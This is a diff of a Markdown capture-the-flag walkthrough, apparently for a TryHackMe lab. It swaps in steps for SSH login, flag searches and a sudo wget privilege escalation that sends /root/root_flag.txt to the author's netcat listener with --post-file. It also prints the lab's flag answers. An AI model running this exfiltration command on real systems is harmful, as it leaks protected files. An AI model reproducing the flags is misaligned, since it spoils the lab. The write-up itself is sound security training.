@@ -141,97 +141,73 @@ chmod 600 id_rsa
 ssh -i id_rsa jessie@wgel.thm
 ```
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-I
-
-###
-
-We quickly try to find user.txt flag using find command:\
-
-
-```bash
-find / -type f -iname user.txt 2>/dev/null
-```
-
-
-
-```bash
-ssh lennie@startup.thm
-```
-
-```bash
-lennie@startup.thm's password: 
-Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-190-generic x86_64)
-
- * Documentation:  https://help.ubuntu.com
- * Management:     https://landscape.canonical.com
- * Support:        https://ubuntu.com/advantage
-
-44 packages can be updated.
-30 updates are security updates.
-
-
-
-The programs included with the Ubuntu system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.
-
-Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
-applicable law.
-
-$ ls
-Documents  scripts  user.txt
-$ cat user.txt
-```
-
-<details>
-
-<summary>🚩 Flag 1 (user.txt)</summary>
-
-THM{03ce3d619b80ccbfb3b7fc81e46c0e79}
-
-</details>
-
-
-
-
-
-### Task 4 - What are the contents of root.txt?
-
-<figure><img src=".gitbook/assets/Schermata del 2023-07-30 12-37-21.png" alt=""><figcaption></figcaption></figure>
-
-Well done! We find root flag:
-
-```bash
-ls
-cat root.txt
-```
-
 <div align="left">
 
-<figure><img src=".gitbook/assets/Schermata del 2023-07-30 12-38-55.png" alt=""><figcaption></figcaption></figure>
+<figure><img src=".gitbook/assets/Schermata del 2023-10-07 15-16-33.png" alt=""><figcaption></figcaption></figure>
 
 </div>
 
+We're in, try to find user.txt flag using find command:\
+
+
+```bash
+find / -type f -iname "*flag.txt" 2>/dev/null
+```
+
+<figure><img src=".gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>
+
 <details>
 
-<summary>🚩 Flag 2 (root.txt)</summary>
+<summary>🚩 Flag 1 (user_flag.txt)</summary>
 
-THM{f963aaa6a430f210222158ae15c3d76d}
+057c67131c3d5e42dd5cd3075b198ff6
+
+</details>
+
+### Task 4 - What are the contents of root.txt?
+
+We can do sudo -l command to discover user's permissions.
+
+<figure><img src=".gitbook/assets/image (49).png" alt=""><figcaption></figcaption></figure>
+
+We can run /usr/bin/wget as root. Perfect, time to go to GTFOBins ([https://gtfobins.github.io/](https://gtfobins.github.io/)) and find our exploit.&#x20;
+
+<figure><img src=".gitbook/assets/image (43).png" alt=""><figcaption><p><a href="https://gtfobins.github.io/gtfobins/wget/">https://gtfobins.github.io/gtfobins/wget/</a></p></figcaption></figure>
+
+<div align="left">
+
+<figure><img src=".gitbook/assets/image (50).png" alt=""><figcaption></figcaption></figure>
+
+</div>
+
+unfortunately, it doesn't work!
+
+Checking on google, we find this good article that suggests to use post-file option of wget  command, to send the content of any file.
+
+<figure><img src=".gitbook/assets/image (44).png" alt=""><figcaption><p><a href="https://www.hackingarticles.in/linux-for-pentester-wget-privilege-escalation/">https://www.hackingarticles.in/linux-for-pentester-wget-privilege-escalation/</a></p></figcaption></figure>
+
+More probably root flag there're in root path and its name will be similar than user\_flag.txt, then, we can try to setting post-file option: —post-file=/root/root\_flag.txt, add our IP and open a listen session with netcat to receive file.
+
+<figure><img src=".gitbook/assets/image (54).png" alt=""><figcaption><p>find IP and listen on port 4444</p></figcaption></figure>
+
+```bash
+sudo /usr/bin/wget http://10.9.80.228:4444 --post-file=/root/root_flag.txt
+```
+
+<figure><img src=".gitbook/assets/image (51).png" alt=""><figcaption></figcaption></figure>
+
+<div align="left">
+
+<figure><img src=".gitbook/assets/image (53).png" alt=""><figcaption></figcaption></figure>
+
+</div>
+
+Well done! Root flag found!
+
+<details>
+
+<summary>🚩 Flag 2 (root_flag.txt)</summary>
+
+b1b968b37519ad1daa6408188649263d
 
 </details>
